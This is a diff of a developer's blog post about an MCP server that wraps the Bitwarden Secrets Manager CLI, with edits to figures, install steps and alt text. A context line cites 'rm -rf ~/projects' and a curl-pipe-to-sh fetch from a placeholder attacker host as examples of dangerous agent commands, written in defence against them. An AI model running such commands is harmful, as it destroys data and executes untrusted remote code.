@@ -97,7 +97,7 @@
 
       <p>Second, <strong>the CLI is the source of truth for argv shape</strong>. BSM has some genuinely unusual conventions — <code>bws secret create</code> takes positional arguments in the order <code>KEY VALUE PROJECT_ID</code>, with optional <code>--note</code>, and this is documented only in the CLI's <code>--help</code> output. The SDK abstracts that away into a method signature, which is fine until you need to debug an invocation and the SDK method doesn't print the actual argv it's about to run. I wanted the MCP server to be transparent: when it calls out to <code>bws</code>, the command it runs looks exactly like what you'd type into a shell. That makes debugging, logging, and auditing trivial. You can take the server's debug output, paste it into a terminal, and get the same result.</p>
 
-      <p>Third, and this is the honest one, <strong>spawning a subprocess is fifty lines of code and the SDK path is a week of yak-shaving</strong>. I wanted v0.1.0 shipped today, not in three weeks. Wrapping the CLI means the MCP server is about 600 lines of TypeScript, most of which is tool schemas and input validation. There's one file — <code>src/bws/client.ts</code> — that handles all the subprocess work, and it's under 200 lines.</p>
+      <p>Third, and this is the honest one, <strong>spawning a subprocess is fifty lines of code and the SDK path is a week of yak-shaving</strong>. I wanted v0.1.0 shipped today, not in three weeks. Wrapping the CLI means the MCP server is about 1,400 lines of TypeScript, most of which is tool schemas and input validation. There's one file — <code>src/bws/client.ts</code> — that handles all the subprocess work, and it's about 350 lines.</p>
 
       <p>The downside is real. If the user's <code>bws</code> binary isn't installed, or isn't on <code>PATH</code>, or is a different version than expected, the server has to handle that gracefully. I ended up adding a <code>BWS_BINARY</code> environment variable override so you can point at any binary you want (useful if you have multiple versions installed), and a <code>bws_status</code> tool that explicitly reports the version it's talking to. If someone wants to rewrite the client layer against the SDK later, the tool surface won't change — the swap is localized to <code>client.ts</code>.</p>
 
@@ -127,7 +127,7 @@ const result = await spawnBws(config, [
 
       <p>The first reason is the obvious one: <strong>if the agent makes a bad call, the blast radius is the entire Unix userland</strong>. <code>rm -rf ~/projects</code> is a valid shell command. <code>curl evil.example.com/x.sh | sh</code> is a valid shell command. If the model hallucinates a plausible-looking incantation, or if an upstream input gets prompt-injected, or if the system prompt gets stripped off mid-conversation, you're one <code>tools/call</code> away from a bad day.</p>
 
-      <p>The second reason is less obvious but more annoying: <strong>portability</strong>. On Debian, <code>/bin/sh</code> is dash. On Arch and macOS, it's bash. On Alpine, it's busybox ash. On FreeBSD, it's a different bash. Each of these handles quoting, expansion, and builtin behavior differently. I found this out the hard way when my integration test suite passed locally (where <code>/bin/sh</code> is bash and happened to slurp up some exported functions from my shell profile) and then failed in a fresh GitHub Actions Ubuntu runner (where <code>/bin/sh</code> is dash and doesn't do that). Then it failed <em>again</em> locally when I ran it from a different shell. The tests weren't broken; the shell under <code>sh -c</code> was just different every time.</p>
+      <p>The second reason is less obvious but more annoying: <strong>portability</strong>. On Debian, <code>/bin/sh</code> is dash. On Arch and macOS, it's bash. On Alpine, it's busybox ash. On FreeBSD, it's a stripped-down ash descendant. Each of these handles quoting, expansion, and builtin behavior differently. I found this out the hard way when my integration test suite passed locally (where <code>/bin/sh</code> is bash and happened to slurp up some exported functions from my shell profile) and then failed in a fresh GitHub Actions Ubuntu runner (where <code>/bin/sh</code> is dash and doesn't do that). Then it failed <em>again</em> locally when I ran it from a different shell. The tests weren't broken; the shell under <code>sh -c</code> was just different every time.</p>
 
       <p>The fix was to get rid of the shell entirely. <code>bws_run</code> now takes an explicit <code>argv</code> array:</p>
 
@@ -166,7 +166,7 @@ const result = await runWithSecrets(config, {
       <p>This was the most important design change in the project, and it only happened because I was staring at a failing integration test with a printf error that made no sense in context.</p>
 
       <figure class="article-figure">
-        <img src="../bws-mcp-handoff.png" alt="Extreme macro of a polished chrome robotic hand cupping a single glowing cyan crystal key on a dark smoky background. Symbolic: the agent being handed a credential, not taking one." />
+        <img src="../bws-mcp-handoff.png" alt="Extreme macro of two symmetric polished chrome two-prong industrial pincers passing a single faceted cyan crystal key between them on a dark smoky background. Symbolic: the agent being handed a credential, not taking one." />
       </figure>
 
       <h2>Why the Tests Are the Story</h2>
@@ -183,7 +183,7 @@ const result = await runWithSecrets(config, {
         <li><strong>Integration tests</strong> (<code>tests/integration/</code>) — exec the real <code>bws</code> binary against a real Bitwarden Secrets Manager project, create secrets and projects with unique prefixes per run, verify every round-trip (create → get → edit → list → delete), clean up in <code>afterEach</code>. Gated behind <code>BWS_ACCESS_TOKEN_TEST</code> and <code>BWS_TEST_PROJECT_ID</code> env vars. Contributors without a Bitwarden account see them skip with a clear log message; contributors with access run them; CI runs them against a dedicated test project on the main branch and on manual workflow dispatch.</li>
       </ol>
 
-      <p>I shipped v0.1.0 with sixty-four unit and protocol tests passing. Then I ran the integration suite against a real BSM project for the first time. Three out of four tests failed, and they were the most useful thirty minutes of the entire project.</p>
+      <p>I shipped v0.1.0 with seventy-one unit and protocol tests passing. Then I ran the integration suite against a real BSM project for the first time. Three out of four tests failed, and they were the most useful thirty minutes of the entire project.</p>
 
       <h3>Bug one: <code>bws secret delete</code> returns plain text</h3>
 
@@ -214,14 +214,14 @@ BwsError: Failed to parse bws stdout as JSON:
 
       <p>This one isn't in the MCP server itself — it's in the <code>redact-history</code> tool I use to periodically scrub secrets from my AI chat transcripts. I mention it here because the debugging arc is identical.</p>
 
-      <p>I was adding a feature to push redaction findings into Bitwarden as a secure note before the script modifies any files, as a recovery tether. First attempt passed the encoded findings JSON as an <em>argv</em> to <code>bw create item</code>, which hit <code>ARG_MAX</code> on Linux (around 128KB of argv per process) the moment the findings got real. Fixed that by piping via stdin. Second attempt ran into the Bitwarden Notes field limit: 10,000 encrypted characters, max, period. I had 1,700 findings; the serialized JSON was about 400KB. Bitwarden refused it.</p>
+      <p>I was adding a feature to push redaction findings into Bitwarden as a secure note before the script modifies any files, as a recovery tether. First attempt passed the encoded findings JSON as an <em>argv</em> to <code>bw create item</code>, which blew up the moment the findings got real — 400KB of JSON on one command line was too much for something inside <code>bw</code>'s argument handling, and the process wedged. Fixed that by piping via stdin. Second attempt ran into the Bitwarden Notes field limit: 10,000 characters, max, period. I had 1,700 findings; the serialized JSON was about 400KB. Bitwarden refused it.</p>
 
       <p>The fix was to use Bitwarden's <em>attachment</em> feature instead: create a tiny secure note containing a summary (counts by pattern, by source, timestamp), then attach the full JSON as a file on the same item. Attachments don't have the same size limit. This is the right shape anyway — the summary is human-readable for triage, and the full data is exactly one <code>bw get attachment</code> away when you need to recover something.</p>
 
       <p>None of these three bugs would have been caught by mocked tests. They only surfaced because the tests exercised the real dependency. Every mock I didn't write is a bug I caught before release instead of after.</p>
 
       <figure class="article-figure">
-        <img src="../bws-mcp-audit-trail.png" alt="Silhouette of a figure from behind facing a floor-to-ceiling wall of cascading teal and amber data columns with abstract glyph blocks." />
+        <img src="../bws-mcp-audit-trail.png" alt="Silhouette of a figure from behind standing centered before a floor-to-ceiling wall of vertical cascading teal and cobalt data columns with abstract glyph blocks." />
       </figure>
 
       <h2>Setup</h2>
@@ -233,10 +233,10 @@ BwsError: Failed to parse bws stdout as JSON:
       <p>The <code>bws-mcp-server</code> doesn't ship with the Bitwarden CLI — it uses whatever's on your <code>PATH</code>. Install it from <a href="https://bitwarden.com/help/secrets-manager-cli/" target="_blank" rel="noopener">Bitwarden's official instructions</a> or via your package manager. On Arch, it's in the AUR:</p>
 
       <pre><code><span class="code-label">bws install</span>
-yay -S --noconfirm bws
+yay -S --noconfirm bws-bin
 bws --version</code></pre>
 
-      <p>On macOS, <code>brew install bitwarden-secrets-manager</code>. On Debian/Ubuntu, grab the binary from the latest GitHub release.</p>
+      <p>On macOS, <code>cargo install bws</code> or grab the binary from the latest GitHub release — there's no Homebrew formula yet. On Debian/Ubuntu, same story: grab the binary from the GitHub release.</p>
 
       <h3>2. Create a machine account and issue a token</h3>
 
